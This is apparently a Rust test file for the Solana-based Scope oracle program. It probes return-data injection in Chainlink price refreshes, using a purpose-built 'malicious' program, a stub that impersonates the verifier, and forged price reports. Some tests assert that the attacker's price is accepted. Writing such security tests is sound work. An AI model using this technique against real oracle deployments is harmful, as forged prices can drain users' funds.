use std::str::FromStr;

use anchor_lang::prelude::*;
use anchor_lang::{InstructionData, ToAccountMetas};
use scope::anchor_lang as _; // ensure features
use solana_program::instruction::{AccountMeta, Instruction};
use solana_program::program_pack::Pack;
use solana_program::pubkey::Pubkey;
use solana_program_test::{processor, ProgramTest};
use solana_sdk::account::Account;
use solana_sdk::signature::{Keypair, Signer};
use solana_sdk::transaction::Transaction;
use solana_sdk::{hash::Hash, system_instruction};

// A tiny malicious program that sets return data
mod malicious {
	use super::*;
	solana_program::declare_id!("9syk1g3Hn9hQ2L1H3iUXFJQvW5bKqrNsWXm2W7h1gFqv");

	pub fn processor(_program_id: &Pubkey, _accounts: &[AccountInfo], ix_data: &[u8]) -> solana_program::entrypoint::ProgramResult {
		use solana_program::program::set_return_data;
		use solana_program::program_error::ProgramError;

		if ix_data.len() < 4 {
			return Err(ProgramError::InvalidInstructionData);
		}
		let len = u32::from_le_bytes(ix_data[0..4].try_into().unwrap()) as usize;
		if ix_data.len() < 4 + len {
			return Err(ProgramError::InvalidInstructionData);
		}
		let malicious = &ix_data[4..4 + len];
		set_return_data(malicious);
		Ok(())
	}
}

// Helper to allocate zero-copy accounts with given size
fn create_alloc_account(owner: &Pubkey, size: usize, lamports: u64) -> Account {
	Account {
		lamports,
		data: vec![0u8; size],
		owner: *owner,
		executable: false,
		rent_epoch: 0,
	}
}

mod verifier_stub {
	use super::*;
	use solana_program::{program::invoke, program::set_return_data};
	// Use the real Chainlink verifier program id so CPI from Scope succeeds
	solana_program::declare_id!("Gt9S41PtjR58CbG9JhJ3J6vxesqrNAswbWYbLNTMZA3c");

	// signed_report payload format understood by this stub:
	// [behavior:1] then depending on behavior:
	//  0x00: no more bytes, do not set return data
	//  0x01: [len1:le u32][rd1 bytes] => set RD to rd1
	//  0x02: [len1:le u32][rd1][len2:le u32][rd2] => set RD to rd1 then CPI to `malicious` with rd2
	pub fn processor(_program_id: &Pubkey, _accounts: &[AccountInfo], ix_data: &[u8]) -> solana_program::entrypoint::ProgramResult {
		// Verify discriminator is present (8 bytes), then borsh-encoded vec<u8>
		if ix_data.len() < 8 + 4 {
			return Ok(()); // malformed -> just succeed with no RD
		}
		let payload_len = u32::from_le_bytes(ix_data[8..12].try_into().unwrap()) as usize;
		if ix_data.len() < 12 + payload_len {
			return Ok(());
		}
		let signed_report = &ix_data[12..12 + payload_len];
		if signed_report.is_empty() {
			return Ok(());
		}
		let behavior = signed_report[0];
		match behavior {
			0x00 => Ok(()),
			0x01 => {
				if signed_report.len() < 1 + 4 { return Ok(()); }
				let l1 = u32::from_le_bytes(signed_report[1..5].try_into().unwrap()) as usize;
				if signed_report.len() < 5 + l1 { return Ok(()); }
				let rd1 = &signed_report[5..5 + l1];
				set_return_data(rd1);
				Ok(())
			}
			0x02 => {
				if signed_report.len() < 1 + 4 { return Ok(()); }
				let l1 = u32::from_le_bytes(signed_report[1..5].try_into().unwrap()) as usize;
				if signed_report.len() < 5 + l1 + 4 { return Ok(()); }
				let rd1 = &signed_report[5..5 + l1];
				let l2_off = 5 + l1;
				let l2 = u32::from_le_bytes(signed_report[l2_off..l2_off+4].try_into().unwrap()) as usize;
				if signed_report.len() < l2_off + 4 + l2 { return Ok(()); }
				let rd2 = &signed_report[l2_off + 4..l2_off + 4 + l2];
				// set rd1 then immediately overwrite with rd2 (simulate callee overwrite without CPI)
				set_return_data(rd1);
				set_return_data(rd2);
				Ok(())
			}
			_ => Ok(()),
		}
	}
}

fn setup_scope_env() -> (ProgramTest, Pubkey) {
	let scope_program_id = scope::id();
	let mut pt = ProgramTest::new("scope", scope_program_id, processor!(scope::entry));
	pt.add_program("malicious", malicious::id(), processor!(malicious::processor));
	pt.add_program("verifier_stub", verifier_stub::id(), processor!(verifier_stub::processor));
	(pt, scope_program_id)
}

fn forge_v3_report(chainlink_feed_pk: Pubkey, price: u128, ts: u32) -> Vec<u8> {
	use chainlink_streams_report::feed_id::ID as FeedID;
	use chainlink_streams_report::report::v3::ReportDataV3;
	use num_bigint::BigInt;
	let report = ReportDataV3 {
		feed_id: FeedID(chainlink_feed_pk.to_bytes()),
		valid_from_timestamp: ts,
		observations_timestamp: ts,
		native_fee: BigInt::from(0u8),
		link_fee: BigInt::from(0u8),
		expires_at: ts.saturating_add(600),
		benchmark_price: BigInt::from(price),
		bid: BigInt::from(price),
		ask: BigInt::from(price),
	};
	report.abi_encode().unwrap()
}

async fn init_scope_with_chainlink_mapping(
	banks_client: &mut solana_program_test::BanksClient,
	payer: &Keypair,
	recent_blockhash: &mut Hash,
	scope_program_id: Pubkey,
	feed_name: &str,
	chainlink_feed_pk: Pubkey,
) -> (Keypair, Keypair, Keypair, Keypair, Pubkey, Keypair) {
	use scope::oracles::chainlink::chainlink_streams_itf::{VERIFIER_PROGRAM_ID};
	// Pre-create accounts
	let token_metadatas = Keypair::new();
	let oracle_twaps = Keypair::new();
	let oracle_prices = Keypair::new();
	let oracle_mappings = Keypair::new();
	let config_account = Keypair::new();
	let (config_pda, _bump) = scope::utils::pdas::config_pubkey(feed_name);
	// Create accounts
	let rent = 10_000_000_000;
	let create_ixs = vec![
		// config account owned by verifier
		system_instruction::create_account(&payer.pubkey(), &config_account.pubkey(), 1_000_000, 0, &VERIFIER_PROGRAM_ID),
		system_instruction::create_account(&payer.pubkey(), &token_metadatas.pubkey(), rent, (8 + scope::utils::consts::TOKEN_METADATA_SIZE) as u64, &scope_program_id),
		system_instruction::create_account(&payer.pubkey(), &oracle_twaps.pubkey(), rent, (8 + scope::utils::consts::ORACLE_TWAPS_SIZE) as u64, &scope_program_id),
		system_instruction::create_account(&payer.pubkey(), &oracle_prices.pubkey(), rent, (8 + scope::utils::consts::ORACLE_PRICES_SIZE) as u64, &scope_program_id),
		system_instruction::create_account(&payer.pubkey(), &oracle_mappings.pubkey(), rent, (8 + scope::utils::consts::ORACLE_MAPPING_SIZE) as u64, &scope_program_id),
	];
	let signer_refs: Vec<&Keypair> = vec![
		payer,
		&config_account,
		&token_metadatas,
		&oracle_twaps,
		&oracle_prices,
		&oracle_mappings,
	];
	let tx = Transaction::new_signed_with_payer(
		&create_ixs,
		Some(&payer.pubkey()),
		signer_refs.as_slice(),
		*recent_blockhash,
	);
	banks_client.process_transaction(tx).await.unwrap();
	*recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();
	// Initialize scope
	let init_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::Initialize {
			admin: payer.pubkey(),
			system_program: solana_program::system_program::id(),
			configuration: config_pda,
			token_metadatas: token_metadatas.pubkey(),
			oracle_twaps: oracle_twaps.pubkey(),
			oracle_prices: oracle_prices.pubkey(),
			oracle_mappings: oracle_mappings.pubkey(),
		}
		.to_account_metas(None),
		data: scope::instruction::Initialize { feed_name: feed_name.to_string() }.data(),
	};
	let mut tx2 = Transaction::new_with_payer(&[init_ix], Some(&payer.pubkey()));
	tx2.sign(&[payer], *recent_blockhash);
	banks_client.process_transaction(tx2).await.unwrap();
	*recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();
	// Update mapping
	let mut generic_data = [0u8; 20];
	generic_data[..4].copy_from_slice(&50u32.to_le_bytes());
	let update_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::UpdateOracleMapping {
			admin: payer.pubkey(),
			configuration: config_pda,
			oracle_mappings: oracle_mappings.pubkey(),
			price_info: Some(chainlink_feed_pk),
		}
		.to_account_metas(None),
		data: scope::instruction::UpdateMapping {
			token: 0u16,
			price_type: scope::oracles::OracleType::Chainlink.into(),
			twap_enabled: false,
			twap_source: 0,
			ref_price_index: u16::MAX,
			feed_name: feed_name.to_string(),
			generic_data,
		}
		.data(),
	};
	let mut tx3 = Transaction::new_with_payer(&[update_ix], Some(&payer.pubkey()));
	tx3.sign(&[payer], *recent_blockhash);
	banks_client.process_transaction(tx3).await.unwrap();
	*recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();
	(
		oracle_prices,
		oracle_mappings,
		oracle_twaps,
		config_account,
		config_pda,
		token_metadatas,
	)
}

fn read_price_fields(data: &[u8]) -> (u64, u64) {
	let off = 8 + 32; // discriminator + oracle_mappings pubkey
	let val = u64::from_le_bytes(data[off..off + 8].try_into().unwrap());
	let exp = u64::from_le_bytes(data[off + 8..off + 16].try_into().unwrap());
	(val, exp)
}

#[tokio::test]
async fn test_verifier_last_writer_blocks_injection() {
	use scope::oracles::chainlink::chainlink_streams_itf::{ACCESS_CONTROLLER_PUBKEY, VERIFIER_CONFIG_PUBKEY, VERIFIER_PROGRAM_ID};
	let (mut pt, scope_program_id) = setup_scope_env();
	let (mut banks_client, payer, _recent_blockhash) = pt.start().await;
	let mut recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();
	let chainlink_feed_kp = Keypair::new();
	let chainlink_feed_pk = chainlink_feed_kp.pubkey();
	let (
		oracle_prices,
		oracle_mappings,
		oracle_twaps,
		config_account,
		_config_pda,
		_token_metadatas,
	) = init_scope_with_chainlink_mapping(&mut banks_client, &payer, &mut recent_blockhash, scope_program_id, "test-feed", chainlink_feed_pk).await;
	let p1: u128 = 100_000_000_000_000_000; // 1e17
	let p2: u128 = 200_000_000_000_000_000; // 2e17
	let ts: u32 = 1_700_000_000;
	let malicious_bytes = forge_v3_report(chainlink_feed_pk, p1, ts);
	let verifier_bytes = forge_v3_report(chainlink_feed_pk, p2, ts);
	// Build malicious ix
	let mut mal_data = Vec::with_capacity(4 + malicious_bytes.len());
	mal_data.extend_from_slice(&(malicious_bytes.len() as u32).to_le_bytes());
	mal_data.extend_from_slice(&malicious_bytes);
	let malicious_ix = Instruction { program_id: malicious::id(), accounts: vec![], data: mal_data };
	// Build refresh ix with signed_report telling verifier stub to set RD to verifier_bytes (behavior 0x01)
	let mut signed_report = Vec::with_capacity(1 + 4 + verifier_bytes.len());
	signed_report.push(0x01);
	signed_report.extend_from_slice(&(verifier_bytes.len() as u32).to_le_bytes());
	signed_report.extend_from_slice(&verifier_bytes);
	let refresh_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::RefreshChainlinkPrice {
			user: payer.pubkey(),
			oracle_prices: oracle_prices.pubkey(),
			oracle_mappings: oracle_mappings.pubkey(),
			oracle_twaps: oracle_twaps.pubkey(),
			verifier_account: VERIFIER_CONFIG_PUBKEY,
			access_controller: ACCESS_CONTROLLER_PUBKEY,
			config_account: config_account.pubkey(),
			verifier_program_id: VERIFIER_PROGRAM_ID,
		}
		.to_account_metas(None),
		data: scope::instruction::RefreshChainlinkPrice { token: 0, serialized_chainlink_report: signed_report }.data(),
	};
	let tx = Transaction::new_signed_with_payer(&[malicious_ix, refresh_ix], Some(&payer.pubkey()), &[&payer], recent_blockhash);
	banks_client.process_transaction(tx).await.unwrap();
	// Read price and assert equals p2, exp=18
	let acct = banks_client.get_account(oracle_prices.pubkey()).await.unwrap().expect("oracle_prices");
	let (val, exp) = read_price_fields(&acct.data);
	assert_eq!(val, p2 as u64);
	assert_eq!(exp, 18);
}

#[tokio::test]
async fn test_callee_overwrites_after_verifier_enables_injection() {
	use scope::oracles::chainlink::chainlink_streams_itf::{ACCESS_CONTROLLER_PUBKEY, VERIFIER_CONFIG_PUBKEY, VERIFIER_PROGRAM_ID};
	let (mut pt, scope_program_id) = setup_scope_env();
	let (mut banks_client, payer, _recent_blockhash) = pt.start().await;
	let mut recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();
	let chainlink_feed_kp = Keypair::new();
	let chainlink_feed_pk = chainlink_feed_kp.pubkey();
	let (
		oracle_prices,
		oracle_mappings,
		oracle_twaps,
		config_account,
		_config_pda,
		_token_metadatas,
	) = init_scope_with_chainlink_mapping(&mut banks_client, &payer, &mut recent_blockhash, scope_program_id, "test-feed", chainlink_feed_pk).await;
	let p_attack: u128 = 100_000_000_000_000_000; // 1e17
	let p_verifier: u128 = 200_000_000_000_000_000; // 2e17
	let ts: u32 = 1_700_000_000;
	let malicious_bytes = forge_v3_report(chainlink_feed_pk, p_attack, ts);
	let verifier_bytes = forge_v3_report(chainlink_feed_pk, p_verifier, ts);
	// Build malicious ix (optional; final last writer will be inside verifier via overwriter)
	let mut mal_data = Vec::with_capacity(4 + malicious_bytes.len());
	mal_data.extend_from_slice(&(malicious_bytes.len() as u32).to_le_bytes());
	mal_data.extend_from_slice(&malicious_bytes);
	let malicious_ix = Instruction { program_id: malicious::id(), accounts: vec![], data: mal_data };
	// Build signed_report that instructs verifier to set RD to verifier_bytes then CPI overwrite with malicious_bytes (behavior 0x02)
	let mut signed_report = Vec::with_capacity(1 + 4 + verifier_bytes.len() + 4 + malicious_bytes.len());
	signed_report.push(0x02);
	signed_report.extend_from_slice(&(verifier_bytes.len() as u32).to_le_bytes());
	signed_report.extend_from_slice(&verifier_bytes);
	signed_report.extend_from_slice(&(malicious_bytes.len() as u32).to_le_bytes());
	signed_report.extend_from_slice(&malicious_bytes);
	let refresh_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::RefreshChainlinkPrice {
			user: payer.pubkey(),
			oracle_prices: oracle_prices.pubkey(),
			oracle_mappings: oracle_mappings.pubkey(),
			oracle_twaps: oracle_twaps.pubkey(),
			verifier_account: VERIFIER_CONFIG_PUBKEY,
			access_controller: ACCESS_CONTROLLER_PUBKEY,
			config_account: config_account.pubkey(),
			verifier_program_id: VERIFIER_PROGRAM_ID,
		}
		.to_account_metas(None),
		data: scope::instruction::RefreshChainlinkPrice { token: 0, serialized_chainlink_report: signed_report }.data(),
	};
	let tx = Transaction::new_signed_with_payer(&[malicious_ix, refresh_ix], Some(&payer.pubkey()), &[&payer], recent_blockhash);
	banks_client.process_transaction(tx).await.unwrap();
	// Expect attacker's price (malicious_bytes) wins as last writer after verifier
	let acct = banks_client.get_account(oracle_prices.pubkey()).await.unwrap().expect("oracle_prices");
	let (val, exp) = read_price_fields(&acct.data);
	assert_eq!(val, p_attack as u64);
	assert_eq!(exp, 18);
}

#[tokio::test]
async fn test_return_data_confusion_with_injector_cpi() {
	use scope::oracles::chainlink::chainlink_streams_itf::{ACCESS_CONTROLLER_PUBKEY, VERIFIER_CONFIG_PUBKEY, VERIFIER_PROGRAM_ID};
	// Set up test validator with Scope and the malicious injector
	let (mut pt, scope_program_id) = setup_scope_env();
	let (mut banks_client, payer, _recent_blockhash) = pt.start().await;
	let mut recent_blockhash = banks_client.get_latest_blockhash().await.unwrap();

	// Pre-create a price_info account to act as Chainlink feed id (mapping)
	let chainlink_feed_kp = Keypair::new();
	let chainlink_feed_pk = chainlink_feed_kp.pubkey();
	let (
		oracle_prices,
		oracle_mappings,
		oracle_twaps,
		config_account,
		_config_pda,
		_token_metadatas,
	) = init_scope_with_chainlink_mapping(&mut banks_client, &payer, &mut recent_blockhash, scope_program_id, "test-feed", chainlink_feed_pk).await;

	let ts: u32 = 1_700_000_000;
	let p_attack: u128 = 100_000_000_000_000_000; // 1e17
	let malicious_bytes = forge_v3_report(chainlink_feed_pk, p_attack, ts);

	// Build malicious instruction (sets return data only)
	let mut malicious_ix_data = Vec::with_capacity(4 + malicious_bytes.len());
	malicious_ix_data.extend_from_slice(&(malicious_bytes.len() as u32).to_le_bytes());
	malicious_ix_data.extend_from_slice(&malicious_bytes);
	let malicious_ix = Instruction {
		program_id: malicious::id(),
		accounts: vec![],
		data: malicious_ix_data,
	};

	// Build the scope refresh instruction with signed_report behavior 0x00 (verifier sets no RD)
	let mut signed_report = vec![0x00u8];
	let refresh_ix = Instruction {
		program_id: scope_program_id,
		accounts: scope::accounts::RefreshChainlinkPrice {
			user: payer.pubkey(),
			oracle_prices: oracle_prices.pubkey(),
			oracle_mappings: oracle_mappings.pubkey(),
			oracle_twaps: oracle_twaps.pubkey(),
			verifier_account: VERIFIER_CONFIG_PUBKEY,
			access_controller: ACCESS_CONTROLLER_PUBKEY,
			config_account: config_account.pubkey(),
			verifier_program_id: VERIFIER_PROGRAM_ID,
		}
		.to_account_metas(None),
		data: scope::instruction::RefreshChainlinkPrice { token: 0, serialized_chainlink_report: signed_report }.data(),
	};

	// Send [malicious sets return data, then scope refresh]
	let tx5 = Transaction::new_signed_with_payer(&[malicious_ix, refresh_ix], Some(&payer.pubkey()), &[&payer], recent_blockhash);
	banks_client.process_transaction(tx5).await.unwrap();

	// Fetch OraclePrices and assert the first entry updated (non-zero)
	let acct = banks_client
		.get_account(oracle_prices.pubkey())
		.await
		.unwrap()
		.expect("oracle_prices account");
	let (val, exp) = read_price_fields(&acct.data);
	assert!(val > 0, "price value should be updated by malicious data");
	assert!(exp <= 18, "reasonable exponent");
}

